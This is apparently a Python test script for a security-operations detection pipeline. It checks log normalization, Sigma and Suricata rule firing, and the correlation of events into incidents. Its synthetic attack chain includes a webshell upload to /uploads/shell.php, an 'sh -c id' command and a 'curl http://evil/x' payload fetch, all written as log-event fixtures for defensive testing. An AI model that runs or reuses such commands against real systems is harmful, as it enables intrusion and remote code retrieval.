"""
tests/test_full_pipeline.py
정규화 → 탐지 → 사건 묶기 전체를 한 번에 돌려 "무엇이 확인되는지"를 보기 쉽게 출력한다.

실행:  python tests/test_full_pipeline.py
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "detection_pipeline"))

from collections import Counter

from tools.normalize import normalize_all
from detect.loader import load_rules
from detect.engine import detect
from detect.suricata_seed import build_suricata_seeds
from correlate.grouping import correlate
from correlate.registry import LINKERS

LINE = "-" * 60
DBL = "=" * 60
_fail = []


def check(label, ok, detail=""):
    mark = "✓" if ok else "✗ FAIL"
    if not ok:
        _fail.append(label)
    print(f"  [{mark}] {label}" + (f"  — {detail}" if detail else ""))


def section(title):
    print(LINE)
    print(f"[{title}]")


# ============================================================
print(DBL)
print("  Agentic SOC 1차탐지 파이프라인 테스트") #현재까지는 정규화 → 탐지 → 사건 묶기만 확인
print("  정규화 → 탐지 → 사건 묶기")
print(DBL)

# ---- ① 정규화 -------------------------------------------------
section("① 정규화  tools/normalize.py")
events = normalize_all()
by_layer = dict(Counter(e["layer"] for e in events))
check("4계층 파서 실행 → 공통 스키마 이벤트 생성", len(events) > 0, f"이벤트 {len(events)}건 {by_layer}")
check("모든 이벤트에 timestamp/layer/raw_ref 존재",
      all(e.get("timestamp") and e.get("layer") and e.get("raw_ref") for e in events))

# ---- ② 탐지 ---------------------------------------------------
section("② 탐지  detect/engine.py + suricata_seed.py")
rules = load_rules(os.path.join(os.path.dirname(__file__), "..", "detection_pipeline", "detect", "rules", "sigma"))
by_dir = dict(Counter(r.path.parent.name for r in rules))
check("Sigma 룰 로드", len(rules) > 0, f"{len(rules)}개 {by_dir}")

sigma_seeds = [seed for _ev, _rule, seed in detect(events, rules, 60)]
suricata_seeds, _rejects = build_suricata_seeds(events, window_seconds=60)
seeds = sigma_seeds + suricata_seeds
check("탐지 실행 → seed 생성(에러 없이)", True, f"Sigma {len(sigma_seeds)} + Suricata {len(suricata_seeds)} = {len(seeds)}건")
check("모든 seed에 evidence_refs 존재", all(s.get("evidence_refs") for s in seeds) if seeds else True)

# ---- ③ 사건 묶기 ----------------------------------------------
section("③ 사건 묶기  correlate/grouping.py")
incidents = correlate(events, seeds)
check("링크 5개 등록됨", len(LINKERS) == 5, f"{sorted(f.__name__ for f in LINKERS)}")
check("사건 묶기 실행 → Incident 리스트 반환", isinstance(incidents, list), f"Incident {len(incidents)}건")

# ---- 공격 시나리오(합성)로 실제 발화·묶임 확인 ----------------
section("공격 시나리오 검증  (합성 웹셸 체인)")

# (a) 탐지: 웹셸 업로드가 apache 룰에 걸리나
webshell_ev = {
    "timestamp": "2026-09-11T02:00:03.000Z", "layer": "web",
    "raw_ref": "apache_access.log:900", "src_ip": "45.9.1.2",
    "layer_data": {"method": "POST", "path": "/uploads/shell.php", "status": 201,
                   "user_agent": "python-requests/2.31"},
}
fired = {r.name for _e, r, _s in detect([webshell_ev], rules, 60)}
check("웹셸 업로드 → apache 룰 발화", "apache_automated_webshell_upload" in fired, f"발화룰={sorted(fired)}")

# (b) 묶기: web + network(http+alert) + system  →  이벤트 4개 / 3계층
chain = [
    webshell_ev,
    {"timestamp": "2026-09-11T02:00:03.200Z", "layer": "network", "raw_ref": "eve.json:100", "src_ip": "45.9.1.2",
     "layer_data": {"event_type": "http", "method": "POST", "url_path": "/uploads/shell.php", "status": 201,
                    "sensor_id": "s1", "flow_id": 1002, "tx_id": 0, "xff_status": "valid",
                    "transport_src_ip": "45.9.1.2", "transport_src_port": 5555,
                    "transport_dest_ip": "10.0.0.1", "transport_dest_port": 80, "protocol": "tcp"}},
    {"timestamp": "2026-09-11T02:00:03.400Z", "layer": "network", "raw_ref": "eve.json:101", "src_ip": "45.9.1.2",
     "layer_data": {"event_type": "alert", "signature": "ET WEB Webshell", "sensor_id": "s1", "flow_id": 1002, "tx_id": 0}},
    {"timestamp": "2026-09-11T02:00:04.500Z", "layer": "system", "raw_ref": "audit.log:20", "pid": 1301, "ppid": 1200,
     "layer_data": {"uid": 33, "user": "www-data", "comm": "sh", "exec_args": "sh -c id"}},
    {"timestamp": "2026-09-11T02:00:05.000Z", "layer": "system", "raw_ref": "audit.log:21", "pid": 1400, "ppid": 1301,
     "layer_data": {"uid": 33, "user": "www-data", "comm": "curl", "exec_args": "curl http://evil/x"}},
    {"timestamp": "2026-09-11T02:00:05.500Z", "layer": "auth", "raw_ref": "auth.log:30", "pid": 1400, "src_ip": None,
     "layer_data": {"event": "sudo_denied", "src_user": "www-data", "user": "root"}},
]
seed = {"entity": {"type": "src_ip", "value": "45.9.1.2"},
        "window": ["2026-09-11T02:00:00Z", "2026-09-11T02:01:00Z"], "layer": "web",
        "source": ["sigma"], "reason": "웹셸 업로드", "signal_tags": ["webroot"],
        "evidence_refs": ["apache_access.log:900"]}
incs = correlate(chain, [seed])
big = max(incs, key=lambda i: len(i["members"])) if incs else {"members": [], "layers": [], "join_path": []}
joins = sorted({e["join"] for e in big["join_path"]})
check("4계층(web+network+system+auth)이 한 사건으로 묶임",
      set(big["layers"]) >= {"web", "network", "system", "auth"},
      f"layers={big['layers']} members={len(big['members'])}")
check("join_path에 링크 5개 모두 연결(web_network·suricata_flow·web_system·audit_lineage·system_auth)",
      {"web_network", "suricata_flow", "web_system", "audit_lineage", "system_auth"} <= set(joins),
      f"joins={joins}")
check("seed가 사건 앵커로 연결됨", bool(big.get("seeds")))

# ============================================================
print(DBL)
if _fail:
    print(f"  결과: 실패 {len(_fail)}건 ✗  →  {_fail}")
    print(DBL)
    sys.exit(1)
print("  결과: 전부 통과 ✅")
print(DBL)
